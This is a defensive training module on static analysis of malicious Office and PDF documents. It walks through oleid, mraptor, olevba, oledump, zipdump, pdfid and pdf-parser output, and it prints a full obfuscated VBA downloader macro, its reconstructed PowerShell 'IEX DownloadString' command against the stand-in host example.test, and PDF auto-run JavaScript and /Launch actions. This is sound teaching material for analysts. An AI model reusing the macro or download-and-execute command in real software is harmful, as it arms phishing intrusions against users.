# Module 14 — Malicious Document Analysis (oletools + the Didier Stevens suite)

**Deck mapping:** *Intrusion Hunting Playbook* → "Initial Access / Phishing Attachments" · *Advanced Intrusion Forensic Hunting* → "Weaponised Documents (Office macros & PDF)."
**Goal:** take a suspicious **Office document** and a suspicious **PDF**, and — **without ever opening them in Office or a reader** — prove whether they are weaponised, read exactly what they would do, and extract the next-stage indicators (URLs, dropped file names, launched programs). The heavy lifting is done by **oletools** (`oleid`, `olevba`) and the **Didier Stevens suite** (`oledump`, `pdfid`, `pdf-parser`, `zipdump`) — and in this module you work from **what those tools already emitted**.

> **You analyse EXTRACTED ARTIFACTS, not live documents.** `data/artifacts/` holds exactly what a **triage/sandbox/extraction pass produces**: the **de-compressed VBA macro source** (plain text) and the **captured reports** of every tool below (`oleid`, `mraptor`, `olevba`, `oledump`, `zipdump`, `pdfid`, `pdf-parser`). This mirrors how analysts routinely work *downstream* of a detonation or an automated extraction: you get the carved artifacts and your job is to read them. Every command below is a **real, working** `cat`/`grep`/`awk`/`python3` invocation against those text artifacts (all on your `PATH` in Git Bash), and it produces the **same IOC findings** you would get from the live files.

> **Evidence note.** The captured tool output is the **real** parse of those exact bytes — so the filenames and the `example.test` lure you see (`Invoice_2024_0042.doc`, `update.ps1`, …) are reported **as-is**.

> **Prerequisite:** none beyond the lab VM. This is the "front door" module — most intrusions begin here, and the IOCs you carve feed Module 9 (did the macro's PowerShell actually run? check 4104) and the malware-triage flow (YARA/capa/FLOSS on the dropped payload).
>
> **Everything below was produced by running the named tools against the three original samples during extraction.** Those samples carried realistic *indicators* — the "download" host is the RFC-6761 reserved, non-routable domain `example.test` — and every tool here is a **static** parser. You now read the carved artifacts they left behind.

---

## 1. Background — why this matters

### Why documents are the #1 way in
A user who would never run `evil.exe` will happily open `Invoice_2024_0042.doc`. For years the most common first step of a real intrusion has been a **phishing attachment**: an Office file with a macro, or a PDF with an auto-running action. The document itself is rarely the malware — it is the **launcher**. It runs a tiny bit of code that reaches out to the internet and pulls down the real payload. Your job in this module is to read that launcher and answer three questions:

1. **Is it weaponised** (does it contain code that runs on open)?
2. **What does it do** (shell out? download? launch a program?)
3. **What is the next stage** (which URL, which dropped file) so you can sweep the rest of the estate for it?

You answer all three **statically** — by reading the parsed bytes, never by detonating — which is exactly why an artifact set (macro source + captured tool reports) is enough: static analysis is *reproducible*, and the same bytes always give the same answer.

> **The 2022 shift — and why this module still matters.** Macro-laden attachments were the dominant initial-access vector *for years*, but in **2022 Microsoft began blocking VBA macros in internet-downloaded Office files by default** — keyed on the same **Mark-of-the-Web** you meet in Module 15. A MOTW-tagged document now shows a red **SECURITY RISK** banner with the one-click *Enable Content* button **removed** (the user must explicitly Unblock the file), so the classic "enable macros" lure largely stopped working. (Excel 4.0 / XLM macros were disabled by default slightly earlier.) Attackers pivoted hard to MOTW-dodging carriers — **`.lnk` shortcuts, ISO/IMG/VHD containers, OneNote (`.one`) attachments, HTML smuggling, and XLL add-ins** — after which Microsoft blunted each in turn (ISO now propagates MOTW to its contents since the Nov-2022 CVE-2022-41091 fix; OneNote blocks dangerous embedded file types since ~April 2023; untrusted XLLs are blocked by default since ~March 2023). **So why still learn macro maldocs?** Because they are *diminished, not dead* — they persist in no-MOTW contexts (network shares, some regional actors) and *inside* those same bypass wrappers — and because **every skill here transfers**: OLE2/Compound-File and OOXML(ZIP) structure, VBA extraction, and the static "parse, don't detonate" discipline are exactly what you apply to a OneNote file, an XLL, or an RTF. This module teaches the *foundation*; the carrier changes, the analysis doesn't.

### How an Office document is built (plain language)
There are two container shapes, and you must recognise which the extraction came from:

- **Legacy / OLE2** (`.doc`, `.xls`, `.ppt`): a single file that is really a tiny **filesystem inside a file** — the **OLE2 Compound File** format. It has "storages" (folders) and "streams" (files). VBA macros live in a storage called `VBA`, and the macro source is **compressed** inside a stream. `Invoice_2024_0042.doc` was this shape.
- **Modern / OOXML** (`.docx`, `.docm`, `.xlsx`, `.xlsm`): a **ZIP archive of XML parts**. A macro-enabled one (`.docm`/`.xlsm`) contains one extra part, `word/vbaProject.bin` (or `xl/vbaProject.bin`) — and *that part is itself an OLE2 file* with the same `VBA` storage inside it. `Statement_Q4.docm` was this shape (it wrapped the very same VBA project as the `.doc`).

So the modern format is just **a ZIP with an OLE2 file inside it**. That is why the extraction used a ZIP tool (`zipdump`) *and* an OLE tool (`oledump`) to reach the macro in a `.docm` — and why the artifact set includes both the ZIP listing and the decompressed stream.

The macro itself is **VBA** (Visual Basic for Applications). The bytes that matter:
- **Auto-exec triggers** — `AutoOpen`, `Document_Open` (Word), `Workbook_Open` (Excel). These run **the moment the file opens**, with no further clicks. Always look for these first.
- **Execution APIs** — `Shell`, `WScript.Shell.Run`, `CreateObject(...)`, or a declared Win32 API like `URLDownloadToFileA`. This is *how* it acts.
- **The payload string** — usually a `powershell ...` command line that downloads and runs the next stage. Often **obfuscated** (built from `Chr()` character codes, `StrReverse`, string concatenation) so it is not obvious in plain text.

### How a PDF is built (plain language)
A PDF is a set of numbered **objects** (`N 0 obj … endobj`) referenced through a **cross-reference table**. A handful of object keywords are dangerous because they cause code to run or a program to start:

- **`/OpenAction`** and **`/AA`** (Additional Actions) — run something **automatically** when the document (or a page) opens. Auto-exec, exactly like `AutoOpen`.
- **`/JavaScript`** and **`/JS`** — embedded JavaScript (PDF readers have a scripting engine). The classic carrier for reader exploits and for "click OK to view" social engineering.
- **`/Launch`** — start an **external program** (`cmd.exe`, `calc.exe`, …).
- **`/URI`** — an external link (phishing / tracking / drive-by).
- **`/EmbeddedFile`, `/RichMedia`** — a packaged payload or Flash/media exploit carrier.

Object **streams** (the JavaScript, for instance) are usually **compressed** with `FlateDecode` (zlib), so a raw view shows gibberish — the extraction asked `pdf-parser` to *decode* the stream, and the readable script is what landed in your artifact.

### The static-analysis mindset
None of the tools that produced these artifacts ran the macro or the JavaScript. They **parsed and decoded**. That is what makes maldoc analysis safe and **reproducible** — the same bytes give the same answer every time, which matters for an investigation report.

---

## 2. What the tools do (and where you see their output)

The tools below produced the artifacts in `data/artifacts/`. You will not re-run them against a live file here (there is none); instead you read and mine their **captured reports**, which is precisely the artifact an automated pipeline hands a downstream analyst.

| Tool | Suite | One-line job | Captured as |
|---|---|---|---|
| **`oleid`** | oletools | 30-second **triage** of an Office file: macros? encrypted? external links? with a **risk level**. | `01_oleid_invoice.txt` |
| **`mraptor`** | oletools | one-shot **macro triage verdict** — tests for the single combination that defines a weaponised macro (**A**utoExec **+ W**rite **+ eX**ecute) and prints `SUSPICIOUS`/clean plus a script-friendly **exit code** (`20` = suspicious). | `02_mraptor_invoice.txt` |
| **`olevba`** | oletools | the **macro workhorse** — extracts the VBA source and runs a keyword/IOC scanner that flags auto-exec, suspicious APIs, and obfuscation; can **deobfuscate** and **reveal** the real strings. | `03_olevba_analysis_invoice.txt`, `04_olevba_reveal_invoice.txt`, `invoice.macro.vba`, `statement.macro.vba` |
| **`oledump`** | Didier Stevens | **OLE stream surgery** — lists the streams, marks which hold a macro (`M`), and **decompresses** the one you pick. Plus plugins (e.g. HTTP-heuristics). | `05_oledump_invoice.txt`, `06_oledump_macro_invoice.txt`, `07_oledump_http_invoice.txt`, `09_statement_vbaproject_streams.txt`, `10_statement_macro.txt` |
| **`zipdump`** | Didier Stevens | inspect a **ZIP/OOXML** (`.docm`/`.xlsm`) without unzipping to disk, and **pipe** a member (the `vbaProject.bin`) into `oledump`. | `08_zipdump_statement.txt` |
| **`pdfid`** | Didier Stevens | PDF **triage** — counts the dangerous keywords (`/JavaScript`, `/OpenAction`, `/Launch`, …). | `11_pdfid_invoice.txt` |
| **`pdf-parser`** | Didier Stevens | PDF **deep dive** — show any object, follow references, and **decode** (decompress) a stream to read the embedded JavaScript or payload. | `12_pdf_openaction.txt`, `13_pdf_obj4.txt`, `14_pdf_obj5_js.txt`, `15_pdf_launch.txt` |
| **`rtfobj`** | oletools | parse **RTF** and extract embedded OLE objects (the Equation-Editor / CVE-2017-11882 carrier). Covered conceptually here; see `research/oletools.md`. | — (no RTF sample) |

**The workflow they encode:** triage with `oleid`/`pdfid`, then dissect with `olevba`/`oledump` and `pdf-parser`. Your hands-on job is to **read those captured reports and the macro source, and re-derive every finding yourself** with `cat`/`grep`/`python3`.

---

## 3. Setup

Open **Git Bash** on the lab VM and change into this module's artifact directory:

```bash
cd module-14-malicious-documents/data/artifacts
```
- **`cd module-14-malicious-documents/data/artifacts`** — move into the folder holding the extracted artifacts (the macro source plus the captured tool reports). **Every command below is run from inside this folder**, so files are named with simple relative paths.
- The commands you run are ordinary text tools — **`cat`, `grep`, `awk`, `python3`** — all installed natively and already on your `PATH` in Git Bash.
- The captured reports were produced on the lab VM (verified 2026-06-29) with **olevba 0.60.2**, **oleid 0.60.1** (oletools); **oledump 0.0.85**, **pdfid 0.2.10**, **pdf-parser 0.7.14**, **zipdump 0.0.35** (Didier Stevens). On the lab VM the Didier tools are exposed **without the `.py` suffix** (`pdfid`, not `pdfid.py`) — you can see the exact banners inside the artifacts themselves.

List what you are working with:

```bash
ls -1
```

---

## 4. Part A — the Office macro document (`Invoice_2024_0042.doc`)

The extraction ran, in order, `oleid` → `mraptor` → `olevba` → `oledump` on the `.doc`. Walk the captured output the same way.

### Step A1 — Triage with `oleid`
Always start with the cheap question: *is this thing worth a deep dive?* Read the captured `oleid` report:

```bash
cat 01_oleid_invoice.txt
```
`oleid` walked the OLE structure and reported a table of indicators with a **Risk** column. The row that matters:

```
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA
                    |                    |          |macros. Suspicious
                    |                    |          |keywords were found. Use
                    |                    |          |olevba and mraptor for
                    |                    |          |more info.
```
**Reading it:** `VBA Macros = Yes, suspicious — HIGH`. That single line is your green light to dig. (`oleid` says *"Generic OLE file / Compound File (unknown format)"* because this teaching sample is a minimal OLE2 VBA container rather than a full Word document — the macro is all that matters here, and `oleid` still finds it.) The `Encrypted = False` and `External Relationships = 0` rows rule out two common evasions (a flagged-but-unreadable encrypted doc, or a remote-template fetch). Pull just the verdict line if you like:

```bash
grep -iE 'VBA Macros|HIGH|Encrypted|External' 01_oleid_invoice.txt
```

### Step A1.5 — One-shot verdict with `mraptor` (triage at scale)
`oleid` literally told you to *"Use olevba and mraptor for more info."* `mraptor` (macro-raptor) hunts for the one combination that defines a weaponised macro — **A**utoExec **+ W**rite **+ eX**ecute — and prints a single verdict plus an **exit code** you can script on.

```bash
cat 02_mraptor_invoice.txt
```
**Captured output:**
```
SUSPICIOUS|AWX  |OLE:|Invoice_2024_0042.doc
Flags: A=AutoExec, W=Write, X=Execute
Exit code: 20 - SUSPICIOUS
```
**Reading it:** `SUSPICIOUS` with all three flags **`AWX`** — the macro auto-runs (`A`), writes to disk (`W`), and executes something (`X`). That is the textbook downloader shape, confirmed in one line. The **exit code** is the real prize (`0` = clean, `20` = suspicious): in production you run `mraptor *.doc *.docm` across an entire phishing-campaign dump and let the exit code *gate* which files earn a full `olevba` dissection. (`mraptor` on the `.docm` returns the same `SUSPICIOUS|AWX` — it reaches the macro **inside** the OOXML ZIP for you, so you do not pre-unpack.)

### Step A2 — Extract & scan the macro with `olevba`
`olevba -a` (analysis-only) was run to produce the IOC/keyword table. Read it:

```bash
cat 03_olevba_analysis_invoice.txt
```
Then let `grep` collapse it to the three verdict classes:

```bash
grep -iE 'AutoExec|Suspicious|IOC' 03_olevba_analysis_invoice.txt
```
**Reading it — this is the whole skill:**
- **`AutoExec` rows** (`AutoOpen`, `Document_Open`) = the macro runs **the instant the file opens**. No further user action.
- **`Suspicious` rows** = *how* it acts: `Shell` + `WScript.Shell` + `run` (it shells out), `powershell` + `New-Object` + `Net.WebClient` + `DownloadString` (it runs a PowerShell downloader), `URLDownloadToFileA` + `Lib` (a declared Win32 download API as a backup), `Environ` (reads `%TEMP%` to choose a drop path), and crucially `Chr` + `StrReverse` (**the code is obfuscated** — the real strings are built at runtime).
- **`IOC` rows** = concrete artefacts to sweep for: a dropped `update.ps1` / `svchost_update.ps1`.

The pattern **AutoExec + Shell/PowerShell + download + obfuscation** is the textbook downloader maldoc. Now read what it actually does.

### Step A3 — Hunt the IOCs in the macro source, then read the payload
The de-compressed VBA source itself is your richest artifact: `invoice.macro.vba` is the exact macro `olevba` carved out of the `.doc`. First hunt the tell-tale bytes:

```bash
grep -iE 'AutoOpen|Document_Open|Shell|WScript|URLDownload|Chr\(|StrReverse|http' invoice.macro.vba
```
That single sweep surfaces every mechanism at once — the two auto-exec entry points, both execution paths (`Shell` and `WScript.Shell.Run`), the backup `URLDownloadToFileA`, the `Chr(...)`/`StrReverse(...)` obfuscation, and the concatenated `http://...` URL. Read the key routine in full to see the intent assembled:

```bash
awk '/^Sub InitDocument/,/^End Sub/' invoice.macro.vba
```
```vba
Sub InitDocument()
    ' "powershell" assembled from character codes (string obfuscation)
    app = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & _
          Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
    host = "http://www" & "." & "example" & "." & "test/inv/update.ps1"
    dest = Environ("TEMP") & "\svchost_update.ps1"
    flags = StrReverse("ssapyb pe neddih w- pon-")   ' -> -nop -w hidden ep bypass
    payload = app & " " & flags & " -c ""IEX (New-Object " & _
        "Net.WebClient).DownloadString('" & host & "')"""
    Shell payload, vbHide                             ' execution path 1
    CreateObject("WScript.Shell").Run payload, 0, False   ' execution path 2
    URLDownloadToFileA 0, host, dest, 0, 0            ' backup: drop to %TEMP%
    CreateObject("WScript.Shell").Run "wscript " & dest, 0, False
End Sub
```
On open it **rebuilds `powershell` from `Chr()` codes**, **reverses** its flags with `StrReverse`, **concatenates** the URL (so a naïve string search for the full URL fails), and runs an `IEX … DownloadString(...)` one-liner to fetch and execute the next stage — with a backup that drops the script to `%TEMP%\svchost_update.ps1` and launches it. Two independent execution paths (`Shell` **and** `WScript.Shell.Run`) mean either alone is enough to run it. The decoy `host` is `www.example.test` (inert).

### Step A4 — Deobfuscate it yourself (make the hidden command print)
Reading obfuscated VBA by eye is error-prone; *compute* the answer. This one-liner reads the `.vba` artifact, rebuilds `powershell` from the `Chr()` codes, reverses the `StrReverse` argument, re-joins the concatenated URL, and prints the reconstructed command:

```bash
python3 -c "import re
q=chr(34); a=chr(39)
t=open('invoice.macro.vba',encoding='utf-8',errors='replace').read()
app=''.join(chr(int(c)) for c in re.findall(r'Chr.(\d+).', t))
flags=re.search(r'StrReverse.\"([^\"]*)\".', t).group(1)[::-1]
host=''.join(re.findall(r'\"([^\"]*)\"', re.search(r'host = (.+)', t).group(1)))
print('powershell (from Chr codes):', app)
print('flags (from StrReverse)    :', flags)
print('staging URL                :', host)
print('reconstructed command      :', app+' '+flags+' -c '+q+'IEX (New-Object Net.WebClient).DownloadString('+a+host+a+')'+q)"
```
**Output:**
```
powershell (from Chr codes): powershell
flags (from StrReverse)    : -nop -w hidden ep bypass
staging URL                : http://www.example.test/inv/update.ps1
reconstructed command      : powershell -nop -w hidden ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://www.example.test/inv/update.ps1')"
```
You just **defeated three obfuscation techniques by computation**: `Chr(112)&Chr(111)&…` → `powershell`, `StrReverse("ssapyb pe neddih w- pon-")` → `-nop -w hidden ep bypass`, and `"http://www" & "." & "example" & …` → the whole URL. (Nice teaching subtlety: the reversed string yields `ep` **without** the leading dash — the author's `StrReverse` source dropped it — so the *computed* flags read `-nop -w hidden ep bypass`, which is exactly what the tool reports too. Trust the computation, not the tidy comment.)

The staging host is `www.example.test` — an **RFC-6761 reserved, non-routable test domain**: a real sample would carry a live C2 host here.

### Step A5 — Verify against olevba's own reveal pass
`olevba --reveal` runs its *own* deobfuscation. Cross-check your reconstruction against the captured reveal report so you are not trusting a single method:

```bash
grep -iE "app = |host = |flags = |DownloadString" 04_olevba_reveal_invoice.txt
```
```
    app = "powershell"
    host = "http://www.example.test/inv/update.ps1"
    flags = "-nop -w hidden ep bypass"
    payload = app & " " & flags & " -c ""IEX (New-Object Net.WebClient).DownloadString('" & host & "')"""
```
Identical to what your `python3` one-liner computed — two independent methods, one answer. That agreement is what you put in the report. The full `04_olevba_reveal_invoice.txt` also contains olevba's **IOC / VBA-string** table, which lists the reconstructed URL `http://www.example.test/inv/update.ps1` and the exact expression that built each hidden string — read it with `cat 04_olevba_reveal_invoice.txt` when you want the tool's own accounting.

### Step A6 — Cross-check the container with `oledump`
`olevba` is automated; `oledump` shows the **raw OLE structure** and a clean decompress — captured here to confirm the source did not come from a stomped/decoy stream. The stream listing:

```bash
cat 05_oledump_invoice.txt
```
```
  1:        96 'PROJECT'
  2:        18 'PROJECTwm'
  3: M    5066 'VBA/Module1'
  4:        40 'VBA/_VBA_PROJECT'
  5:       272 'VBA/dir'
```
The **`M`** on stream **3** marks the stream that holds real macro code (`oledump -s 3 -v` was used to decompress it). Confirm the decompressed source (`06_oledump_macro_invoice.txt`) matches the `olevba` extraction byte-for-byte:

```bash
grep -iE 'Chr\(|StrReverse|host =|Shell|URLDownload' 06_oledump_macro_invoice.txt
```
Finally, the HTTP-heuristics plugin (`oledump -p plugin_http_heuristics`):

```bash
cat 07_oledump_http_invoice.txt
```
```
  3: M    5066 'VBA/Module1'
               Plugin: HTTP Heuristics plugin
                 http://www
```
Note it surfaces only `http://www` — the *prefix* of the concatenated URL. That is a teaching point in itself: **string concatenation (`"http://www" & "." & "example" …`) deliberately breaks a single literal**, so a heuristic that keys on contiguous bytes only recovers a fragment. The reliable read is your **computed reconstruction** in A4 (confirmed by olevba's reveal in A5), where you see the whole thing assembled.

---

## 5. Part B — the modern Office path (`Statement_Q4.docm`, OOXML)

`Statement_Q4.docm` carried the **same VBA project** as Part A, but in the modern **OOXML (ZIP)** container. You cannot point `oledump` at a `.docm` directly — the extraction first reached the `vbaProject.bin` *inside the ZIP* with `zipdump`, then piped it into `oledump`. The artifacts capture each stage.

### Step B1 — The ZIP members (`zipdump`)
```bash
cat 08_zipdump_statement.txt
```
```
Index Filename                     Encrypted Timestamp
    1 [Content_Types].xml                  0 2024-11-04 09:00:00
    2 _rels/.rels                          0 2024-11-04 09:00:00
    3 word/document.xml                    0 2024-11-04 09:00:00
    4 word/_rels/document.xml.rels         0 2024-11-04 09:00:00
    5 word/vbaProject.bin                  0 2024-11-04 09:00:00
```
Member **5**, `word/vbaProject.bin`, is the OLE2 macro store. Its mere presence in a `.docx`/`.docm` already tells you the document is macro-enabled. (Extraction command: `zipdump -s 5 -d Statement_Q4.docm | oledump …` — pipe the member straight into `oledump` **without writing it to disk**.)

### Step B2 — The macro store's streams (`oledump` over the pipe)
```bash
cat 09_statement_vbaproject_streams.txt
```
```
  3: M    5066 'VBA/Module1'
```
Same `M`-flagged `VBA/Module1`, same 5066 bytes as the `.doc`. The decompressed source landed in `10_statement_macro.txt`.

### Step B3 — Prove it is the *same* payload
Two containers, one macro — show it, don't assert it. Diff the `.docm`'s decompressed macro against the `.doc`'s:

```bash
diff 06_oledump_macro_invoice.txt 10_statement_macro.txt && echo "IDENTICAL — same VBA project in both containers"
```
`diff` prints nothing and the `echo` fires: the two macro sources are **byte-for-byte identical**. The lesson: `.docx`/`.docm` is a ZIP — reach the `vbaProject.bin` first, *then* `oledump`. (`olevba` also handles OOXML natively, which is why `statement.macro.vba` — the captured `olevba` run on the `.docm` — reports `Type: OpenXML` and `in file: word/vbaProject.bin` in its header; compare it to `invoice.macro.vba` to see the identical body under a different container banner.)

> **Tool gap worth knowing:** upstream Didier Stevens docs (and `research/didier-stevens-suite.md`) show piping with a `-` filename (`… | oledump -s 3 -v -`). On the lab VM's **oledump 0.0.85** the `-` argument fails with `Error: - is not a file.` — the working form during extraction was to pipe in **with no filename at all**.

---

## 6. Part C — the malicious PDF (`Invoice_2024_0042.pdf`)

The extraction ran `pdfid` for triage, then `pdf-parser` to walk the auto-action chain and decode the JavaScript. Read the captured reports in the same order.

### Step C1 — Triage with `pdfid`
```bash
cat 11_pdfid_invoice.txt
```
```
PDFiD 0.2.10 Invoice_2024_0042.pdf
 obj                    8
 /Page                  1
 /JS                    2
 /JavaScript            3
 /AA                    1
 /OpenAction            1
 /Launch                1
```
Pull just the dangerous keywords:

```bash
grep -iE 'JavaScript|OpenAction|Launch|/JS|/AA' 11_pdfid_invoice.txt
```
**Reading it:** any non-zero `/JavaScript`, `/JS`, `/OpenAction`, `/AA`, or `/Launch` means *investigate*. Here you have **all of them**: JavaScript that runs **automatically** (`/OpenAction` + `/AA`) and a `/Launch` action that would start an external program. That is a weaponised PDF; follow the `pdf-parser` walk.

### Step C2 — Follow the auto-action chain
`pdf-parser -s OpenAction` showed the document **Catalog** and where the auto-action points:

```bash
cat 12_pdf_openaction.txt
```
```
obj 1 0
 Type: /Catalog
    /OpenAction 4 0 R
    /Names << /JavaScript << /Names [ (AcmeBoot) 7 0 R ] >> >>
```
`/OpenAction 4 0 R` → the action is **object 4**. `pdf-parser -o 4` showed it:

```bash
cat 13_pdf_obj4.txt
```
```
obj 4 0
 Type: /Action
  << /Type /Action /S /JavaScript /JS 5 0 R >>
```
It is a **JavaScript action** whose script is in **object 5**.

### Step C3 — The decoded JavaScript stream
Object 5's stream is `FlateDecode`-compressed; `pdf-parser -o 5 -f` **applied the filter** and decoded it. Read the decoded script and pull the network IOC:

```bash
cat 14_pdf_obj5_js.txt
```
```
obj 5 0
 Contains stream
  << /Length 194 /Filter /FlateDecode >>
 b'// Acme Secure Reader bootstrap\n
   app.alert({cMsg: "This document is protected. Click OK to view it.", ...});\n
   var trackUrl = "http://www.example.test/track?doc=INV-2024-0042";\n
   app.launchURL(trackUrl, true);\n'
```
```bash
grep -oiE 'app\.(alert|launchURL)|http://[^"]+' 14_pdf_obj5_js.txt
```
The JavaScript pops a lure dialog (`app.alert`) and calls **`app.launchURL`** to a tracking URL — your extracted **network IOC**, again on the `example.test` domain. **Without `-f` the extraction would have captured only compressed gibberish**; the decoded stream is what makes the intent readable.

### Step C4 — The `/Launch` action
`pdf-parser -s Launch` found the external-program action:

```bash
cat 15_pdf_launch.txt
```
```
obj 8 0
 Type: /Action
  << /Type /Action /S /Launch
     /Win << /F (calc.exe) /D (C:\Windows\System32) /P () >> >>
```
A `/Launch` action that starts **`calc.exe`** (the classic harmless stand-in for "an arbitrary program"). It is wired to the **page's `/AA /O`** (additional action, "on open"), so it too would fire automatically. Read both auto-exec carriers together:

```bash
grep -iE 'launchURL|calc\.exe|/Launch|/OpenAction' 12_pdf_openaction.txt 14_pdf_obj5_js.txt 15_pdf_launch.txt
```

---

## 7. Reading the output — suspicious vs benign

| Signal | Benign | Suspicious |
|---|---|---|
| **`oleid` VBA Macros** | "No" | **"Yes, suspicious — HIGH"** |
| **`olevba` AutoExec** | none | `AutoOpen` / `Document_Open` / `Workbook_Open` present |
| **`olevba` Suspicious** | a lone `Environ` | `Shell` + `powershell`/`WScript.Shell.Run` + `DownloadString`/`URLDownloadToFileA` |
| **`olevba` obfuscation** | none | `Chr`, `StrReverse`, heavy `&` concatenation building commands |
| **`oledump` stream flag** | lowercase `m` (attributes only) or none | uppercase **`M`** (real macro code) |
| **`pdfid`** | all of `/JS /OpenAction /AA /Launch` = 0 | any of them non-zero |
| **`pdf-parser` action `/S`** | `/GoTo`, `/Named` | **`/JavaScript`**, **`/Launch`**, `/URI` reached from `/OpenAction` or `/AA` |
| **PDF stream** | text you can read raw | needed `-f` to decode, and the decoded script calls `app.launchURL`/`eval`/`unescape` |

The headline skill across both formats: **find the auto-exec trigger, then read the de-obfuscated/decoded code it runs.** Obfuscation and compression hide the *bytes*; the captured artifacts (and your own `python3` reconstruction) hand you the *intent*.

---

## 8. Investigative narrative — the story the evidence tells

A finance user reports two attachments from a "supplier," `Invoice_2024_0042.doc` and `Invoice_2024_0042.pdf`, plus a `Statement_Q4.docm`. Nobody opens them; the triage pipeline parses them and hands you the carved artifacts.

1. **The `.doc`** triaged **HIGH** in `oleid` (VBA, suspicious) and `SUSPICIOUS|AWX` in `mraptor`. `olevba` showed **AutoOpen/Document_Open** + a **PowerShell `DownloadString` downloader**, with the command **obfuscated** by `Chr()`/`StrReverse`/concatenation. Your own `python3` deobfuscation (confirmed by `olevba --reveal` and `oledump -s 3 -v`) reads the assembled command and the next-stage URL/dropped path: `…/inv/update.ps1` → `%TEMP%\svchost_update.ps1`.
2. **The `.docm`** is the **same payload in modern clothing**: `zipdump` shows `word/vbaProject.bin`; `oledump` over it reveals the identical macro — `diff` proves the two macro sources are byte-for-byte equal. (Lesson: `.docx`/`.docm` is a ZIP — reach the `vbaProject.bin` first.)
3. **The `.pdf`** triaged dirty in `pdfid` (`/JavaScript`, `/OpenAction`, `/AA`, `/Launch`). `pdf-parser` walked `/OpenAction → object 4 (JS action) → object 5`, and `-f` **decoded** the compressed JavaScript to reveal an `app.launchURL` tracker; a separate **`/Launch`** action (wired to the page `/AA`) would start `calc.exe`.

**The pivot:** every extracted IOC — the staging URL, `update.ps1`/`svchost_update.ps1`, the PDF tracker URL — now becomes a sweep across the estate. Did the macro's PowerShell actually execute? That is a **4104 Script Block Logging** question → **Module 9**. Is the dropped script on disk anywhere? → the disk/timeline modules. **Documents are the launcher; the launcher names the next stage.**

---

## 9. Try-it-yourself exercises

1. **Triage first.** `cat 01_oleid_invoice.txt` and `cat 11_pdfid_invoice.txt`. In one sentence each, state *why* each file warrants a deep dive (name the single most damning indicator).
2. **Obfuscation can't hide intent.** Run the Step A4 `python3` one-liner. Write out — in plain text — the full PowerShell command the macro builds. Show how `Chr()`, `StrReverse`, and `&` concatenation each hid a piece of it, and confirm your answer against `04_olevba_reveal_invoice.txt`.
3. **Two methods, one answer.** Compare your Step A4 reconstruction with the `app =`/`host =`/`flags =` lines in `04_olevba_reveal_invoice.txt`. Where does the reversed-string quirk (`ep` vs `-ep`) show up, and why should you trust the computation over the source comment?
4. **Same payload, two containers.** Prove `Statement_Q4.docm` carries the *same* macro as the `.doc`: `diff 06_oledump_macro_invoice.txt 10_statement_macro.txt`. Which `zipdump` member number is the `vbaProject.bin` (see `08_zipdump_statement.txt`), and why can't you run `oledump` on a `.docm` directly?
5. **Follow the chain.** Using only `12_pdf_openaction.txt`, `13_pdf_obj4.txt`, and `14_pdf_obj5_js.txt`, trace the path `/OpenAction → object 4 → the JavaScript in object 5`, *and* find the object number of the `/Launch` action (`15_pdf_launch.txt`). Which two indicators make this PDF "auto-exec"?
6. **Extract the IOCs.** List every network/file indicator from all three samples (URLs, dropped file names, launched program). For each, name the **next module** you would pivot to in order to prove it ran.

---

## 10. Key takeaways

- **Office and PDF documents are launchers, not malware** — they run a small auto-exec stub that fetches the real payload. Your job is to read the stub statically and extract the next stage.
- **You can do all of it from extracted artifacts.** The macro source + captured `oleid`/`mraptor`/`olevba`/`oledump`/`pdfid`/`pdf-parser` reports contain every finding the live files would. This mirrors real downstream analysis after a detonation/extraction.
- **Triage before you dissect:** `oleid` (Office) and `pdfid` (PDF) tell you in seconds whether to go deeper — look for **VBA Macros = suspicious/HIGH** and any non-zero **`/JavaScript` `/OpenAction` `/AA` `/Launch`**. For Office triage **at scale**, `mraptor`'s **AWX** verdict + **exit code 20** gates the deep dive automatically across a whole batch.
- **Find the auto-exec trigger first:** `AutoOpen`/`Document_Open`/`Workbook_Open` in VBA; `/OpenAction`/`/AA` in PDF. No trigger, far lower urgency.
- **Then read the de-obfuscated/decoded code:** `olevba --reveal` (and `oledump -s N -v`) for VBA; `pdf-parser -o N -f` for the compressed PDF script — and re-derive it yourself (the Step A4 `python3` one-liner) so two independent methods agree. Obfuscation hides bytes; computation and these tools hand you intent.
- **Know your container:** legacy `.doc`/`.xls` are **OLE2** (use `oledump` directly); modern `.docm`/`.xlsm` are **ZIP** (use `zipdump` to reach `vbaProject.bin`, *then* `oledump`).
- **The output is IOCs.** Every URL, dropped file, and launched program you carve feeds the next module (did it run? → **Module 9 / 4104**) and the malware-triage flow (YARA/capa/FLOSS on the dropped payload). The staging host here is the RFC-6761 `example.test`.

---

## 11. Sources & further reading

- oletools — official wiki (per-tool usage for `olevba`, `oleid`, `rtfobj`, `oleobj`): https://github.com/decalage2/oletools/wiki
- Didier Stevens — tool blog & suite (`pdfid`, `pdf-parser`, `oledump`, `zipdump`, plugins, and many real maldoc/PDF walkthroughs): https://blog.didierstevens.com/ and https://github.com/DidierStevens/DidierStevensSuite
- SANS ISC diaries by Didier Stevens — step-by-step `pdfid → pdf-parser` and `oledump` analyses of real samples: https://isc.sans.edu/
- MITRE ATT&CK — **T1566.001** Spearphishing Attachment, **T1204.002** Malicious File, **T1137** Office template/macro persistence.
- **[MS-OVBA]** (VBA macro / `dir` stream & compression) and **[MS-CFB]** (the OLE2 Compound File) — the formats the tools parse; also the Adobe **PDF reference** for PDF object/action structure.
- CVE-2017-11882 (Equation Editor) — context for `rtfobj`'s `Equation.3` findings.
- Module research notes: `research/oletools.md` and `research/didier-stevens-suite.md` (every flag, with pitfalls).

See `data/README.md` for the exact provenance, license, and **build steps** behind each artifact, and how the captured reports were generated.

## Pivot
- A macro/JS that runs PowerShell → **Module 9 (PowerShell Tradecraft)**: did it execute? Read the **4104** script block.
- Carved URLs / dropped files → the **disk & timeline** modules to find the dropper on the host.
- Each extracted payload → the **YARA / capa / FLOSS** triage flow (`research/yara.md`, `research/capa.md`, `research/floss.md`).

---
*The "front door" module: where most intrusions begin, and where you name the next stage.*
